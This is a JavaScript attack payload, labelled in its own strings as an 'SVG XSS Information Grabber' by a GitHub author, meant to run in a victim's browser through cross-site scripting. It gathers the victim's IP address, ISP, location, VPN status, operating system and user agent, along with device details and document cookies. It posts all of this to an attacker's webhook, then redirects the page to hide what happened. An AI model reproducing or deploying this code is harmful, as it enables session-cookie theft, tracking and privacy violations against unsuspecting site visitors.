var REDIRECTURL = "REDIRECT";
var WEBHOOKURL = "WEBHOOK";
try {
    function senddata(opts2) {
        fetch(WEBHOOKURL, opts2).then(function (response) {
            console.log(response);
            redirect()
        })
    }
    function redirect() {
        window.location.replace(REDIRECTURL);
    }
    function detectWebcam(callback) {
        let md = navigator.mediaDevices;
        if (!md || !md.enumerateDevices) return callback(false);
        md.enumerateDevices().then(devices => {
            callback(devices.some(device => 'videoinput' === device.kind));
        })
    }

    function detectMic(callback) {
        let md = navigator.mediaDevices;
        if (!md || !md.enumerateDevices) return callback(false);
        md.enumerateDevices().then(devices => {
            callback(devices.some(device => 'audioinput' === device.kind));
        })
    }
    detectWebcam(function (hasWebcam) {
        camera = hasWebcam ? '✅' : '❌'
    })
    detectMic(function (hasMic) {
        mic = hasMic ? '✅' : '❌'
    })
    var opts = { method: 'GET', headers: {} };
    fetch('https://api.ipify.org?format=json', opts).then(function (response) { return response.json() }).then(function (data2) {
        fetch('https://myip.wtf/json', opts).then(function (response) { return response.json() }).then(function (data) {
            var Name = "Not known";
            if (navigator.appVersion.indexOf("Win") != -1) Name = "Windows OS";
            if (navigator.appVersion.indexOf("Mac") != -1) Name = "MacOS";
            if (navigator.appVersion.indexOf("X11") != -1) Name = "UNIX OS";
            if (navigator.appVersion.indexOf("Linux") != -1) Name = "Linux OS";
            if (!Name) Name = navigator.appVersion
            let opts2 = {}
            try {
                navigator.getBattery().then(function (battery) {
                    try {
                        navigator.bluetooth.getAvailability().then(function (isBluetoothAvailable) {
                            bluetooth = isBluetoothAvailable ? '✅' : '❌'
                            batterycharge = battery.charging ? '✅' : '❌'
                            cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                            try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }

                            let other = "```\nDownload Speed: " +
                                down +
                                '\nScreen Size: ' +
                                window.screen.availWidth + " x " + window.screen.availHeight +
                                '\nBrowser Window Size: ' +
                                window.innerWidth + " x " + window.innerHeight +
                                '\nUsed CPU Cores: ' +
                                navigator.hardwareConcurrency +
                                '\nBattery Charging: ' +
                                batterycharge +
                                "\nCookies: " +
                                cookies +
                                "\nWebcam?: " +
                                camera +
                                "\nMicrophone?: " +
                                mic +
                                "\nBluetooth?: " +
                                bluetooth +
                                "\nPrevious Page: " +
                                document.referrer +
                                "\n```"
                            opts2 = {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    username: "SVG XSS Information Grabber - By SEALL on Github",
                                    avatar_url: "https://i.imgur.com/Yztlbk4.png",
                                    embeds: [{
                                        title: 'SVG XSS Attack By SEALL (v1.2)',
                                        fields: [
                                            { name: 'IPv4/IPv6 :globe_with_meridians:', value: "`" + data.YourFuckingIPAddress + "`", inline: "true" },
                                            { name: 'IPv4 :globe_with_meridians:', value: "`" + data2.ip + "`", inline: "true" },
                                            { name: 'OS :floppy_disk:', value: "`" + Name + "`", inline: 'false' },
                                            { name: 'User Agent :bust_in_silhouette:', value: "`" + navigator.userAgent + "`", inline: "false" },
                                            { name: 'Hostname :name_badge:', value: "`" + data.YourFuckingHostname + "`", inline: "true" },
                                            { name: 'ISP :classical_building:', value: "`" + data.YourFuckingISP + '`', inline: 'true' },
                                            { name: 'VPN :computer:', value: "`" + data.YourFuckingTorExit + '`', inline: 'true' },
                                            { name: 'Location :map:', value: "`" + data.YourFuckingLocation + '`', inline: 'true' },
                                            { name: 'Original URL :globe_with_meridians:', value: "`" + window.location.href + '`', inline: 'true' },
                                            { name: 'Page Redirect URL :question:', value: "`" + REDIRECTURL + '`', inline: 'true' },
                                            { name: 'Other', value: other, inline: 'false' }
                                        ]
                                    }]
                                })
                            }
                            senddata(opts2)
                        })
                    }
                    catch (err) {
                        batterycharge = battery.charging ? '✅' : '❌'
                        cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                        try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                        let other = "```\nDownload Speed: " +
                            down +
                            '\nScreen Size: ' +
                            window.screen.availWidth + " x " + window.screen.availHeight +
                            '\nBrowser Window Size: ' +
                            window.innerWidth + " x " + window.innerHeight +
                            '\nUsed CPU Cores: ' +
                            navigator.hardwareConcurrency +
                            '\nBattery Charging: ' +
                            batterycharge +
                            "\nCookies: " +
                            cookies +
                            "\nWebcam?: " +
                            camera +
                            "\nMicrophone?: " +
                            mic +
                            "\nBluetooth?: " +
                            "Unavailable" +
                            "\nPrevious Page: " +
                            document.referrer +
                            "\n```"
                        opts2 = {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                username: "SVG XSS Information Grabber - By SEALL on Github",
                                avatar_url: "https://i.imgur.com/Yztlbk4.png",
                                embeds: [{
                                    title: 'SVG XSS Attack By SEALL (v1.2)',
                                    fields: [
                                        { name: 'IPv4/IPv6 :globe_with_meridians:', value: "`" + data.YourFuckingIPAddress + "`", inline: "true" },
                                        { name: 'IPv4 :globe_with_meridians:', value: "`" + data2.ip + "`", inline: "true" },
                                        { name: 'OS :floppy_disk:', value: "`" + Name + "`", inline: 'false' },
                                        { name: 'User Agent :bust_in_silhouette:', value: "`" + navigator.userAgent + "`", inline: "false" },
                                        { name: 'Hostname :name_badge:', value: "`" + data.YourFuckingHostname + "`", inline: "true" },
                                        { name: 'ISP :classical_building:', value: "`" + data.YourFuckingISP + '`', inline: 'true' },
                                        { name: 'VPN :computer:', value: "`" + data.YourFuckingTorExit + '`', inline: 'true' },
                                        { name: 'Location :map:', value: "`" + data.YourFuckingLocation + '`', inline: 'true' },
                                        { name: 'Original URL :globe_with_meridians:', value: "`" + window.location.href + '`', inline: 'true' },
                                        { name: 'Page Redirect URL :question:', value: "`" + REDIRECTURL + '`', inline: 'true' },
                                        { name: 'Other', value: other, inline: 'false' }
                                    ]
                                }]
                            })
                        }
                        senddata(opts2)
                    }
                })
            }
            catch (err) {
                try {
                    navigator.bluetooth.getAvailability().then(function (isBluetoothAvailable) {
                        bluetooth = isBluetoothAvailable ? '✅' : '❌'
                        cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                        try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                        let other = "```\nDownload Speed: " +
                            down +
                            '\nScreen Size: ' +
                            window.screen.availWidth + " x " + window.screen.availHeight +
                            '\nBrowser Window Size: ' +
                            window.innerWidth + " x " + window.innerHeight +
                            '\nUsed CPU Cores: ' +
                            navigator.hardwareConcurrency +
                            "\nCookies: " +
                            cookies +
                            "\nWebcam?: " +
                            camera +
                            "\nMicrophone?: " +
                            mic +
                            "\nBluetooth?: " +
                            bluetooth +
                            "\nPrevious Page: " +
                            document.referrer +
                            "\n```"
                        opts2 = {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                username: "SVG XSS Information Grabber - By SEALL on Github",
                                avatar_url: "https://i.imgur.com/Yztlbk4.png",
                                embeds: [{
                                    title: 'SVG XSS Attack By SEALL (v1.2)',
                                    fields: [
                                        { name: 'IPv4/IPv6 :globe_with_meridians:', value: "`" + data.YourFuckingIPAddress + "`", inline: "true" },
                                        { name: 'IPv4 :globe_with_meridians:', value: "`" + data2.ip + "`", inline: "true" },
                                        { name: 'OS :floppy_disk:', value: "`" + Name + "`", inline: 'false' },
                                        { name: 'User Agent :bust_in_silhouette:', value: "`" + navigator.userAgent + "`", inline: "false" },
                                        { name: 'Hostname :name_badge:', value: "`" + data.YourFuckingHostname + "`", inline: "true" },
                                        { name: 'ISP :classical_building:', value: "`" + data.YourFuckingISP + '`', inline: 'true' },
                                        { name: 'VPN :computer:', value: "`" + data.YourFuckingTorExit + '`', inline: 'true' },
                                        { name: 'Location :map:', value: "`" + data.YourFuckingLocation + '`', inline: 'true' },
                                        { name: 'Original URL :globe_with_meridians:', value: "`" + window.location.href + '`', inline: 'true' },
                                        { name: 'Page Redirect URL :question:', value: "`" + REDIRECTURL + '`', inline: 'true' },
                                        { name: 'Other', value: other, inline: 'false' }
                                    ]
                                }]
                            })
                        }
                        senddata(opts2)
                    })
                }
                catch (err) {
                    cookies = navigator.cookieEnabled ? `✅ ${document.cookie}` : '❌'
                    try { down = navigator.connection.downlink + "mbps" } catch (err) { down = "unknown " }
                    let other = "```\nDownload Speed: " +
                        down +
                        '\nScreen Size: ' +
                        window.screen.availWidth + " x " + window.screen.availHeight +
                        '\nBrowser Window Size: ' +
                        window.innerWidth + " x " + window.innerHeight +
                        '\nUsed CPU Cores: ' +
                        navigator.hardwareConcurrency +
                        "\nCookies: " +
                        cookies +
                        "\nWebcam?: " +
                        camera +
                        "\nMicrophone?: " +
                        mic +
                        "\nBluetooth?: " +
                        "Unavailable" +
                        "\nPrevious Page: " +
                        document.referrer +
                        "\n```"
                    opts2 = {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            username: "SVG XSS Information Grabber - By SEALL on Github",
                            avatar_url: "https://i.imgur.com/Yztlbk4.png",
                            embeds: [{
                                title: 'SVG XSS Attack By SEALL (v1.2)',
                                fields: [
                                    { name: 'IPv4/IPv6 :globe_with_meridians:', value: "`" + data.YourFuckingIPAddress + "`", inline: "true" },
                                    { name: 'IPv4 :globe_with_meridians:', value: "`" + data2.ip + "`", inline: "true" },
                                    { name: 'OS :floppy_disk:', value: "`" + Name + "`", inline: 'false' },
                                    { name: 'User Agent :bust_in_silhouette:', value: "`" + navigator.userAgent + "`", inline: "false" },
                                    { name: 'Hostname :name_badge:', value: "`" + data.YourFuckingHostname + "`", inline: "true" },
                                    { name: 'ISP :classical_building:', value: "`" + data.YourFuckingISP + '`', inline: 'true' },
                                    { name: 'VPN :computer:', value: "`" + data.YourFuckingTorExit + '`', inline: 'true' },
                                    { name: 'Location :map:', value: "`" + data.YourFuckingLocation + '`', inline: 'true' },
                                    { name: 'Original URL :globe_with_meridians:', value: "`" + window.location.href + '`', inline: 'true' },
                                    { name: 'Page Redirect URL :question:', value: "`" + REDIRECTURL + '`', inline: 'true' },
                                    { name: 'Other', value: other, inline: 'false' }
                                ]
                            }]
                        })
                    }
                    senddata(opts2)
                    
                }
            }
        })
    })
}

catch (err) {
    console.log(err);
    redirect()
};  